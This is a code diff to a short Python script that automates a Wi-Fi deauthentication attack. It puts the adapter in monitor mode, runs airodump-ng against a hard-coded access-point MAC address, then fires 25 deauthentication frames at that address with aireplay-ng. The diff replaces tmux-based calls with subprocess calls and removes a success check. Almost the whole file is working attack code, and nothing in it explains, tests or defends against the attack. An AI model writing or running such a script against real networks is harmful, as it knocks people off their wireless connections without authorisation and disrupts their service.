@@ -1,22 +1,20 @@
 import os
-import subprocess
+import subprocess as sub
+import time
 from subprocess import check_call
 
-def deauth():
-    print("\nAttempting Deauthentication Attack")
-    order = "tmux new -d"
-    geny  = os.system(order)
-    order = "tmux send -Rt 0 airodump-ng -d F4:F2:6D:3C:40:92 -c 1 wlan0mon"
-    geny  = os.system(order)
-    #order = "airodump-ng -d F4:F2:6D:3C:40:92 -c 1 wlan0mon"
-    #geny  = os.system(order)
+def channelset():
+    sub.call(['airmon-ng', 'start', 'wlan0'])
+    p = sub.Popen(['airodump-ng', '-d', 'F4:F2:6D:3C:40:92', '-c', '1', 'wlan0mon'])
+    time.sleep(2)
+    p.kill()
 
+def deauth():
+    channelset()
     os.system("PID=$!")
     #os.system("kill PID")
-
     order = "aireplay-ng -0 25 -a F4:F2:6D:3C:40:92  wlan0mon"
     geny  = os.system(order)
-    if geny == 2:
-        print("\nDeauthentication Complete.\n")
-        return 1    
-    return 0    
+    print(geny)
+    return 1
+    
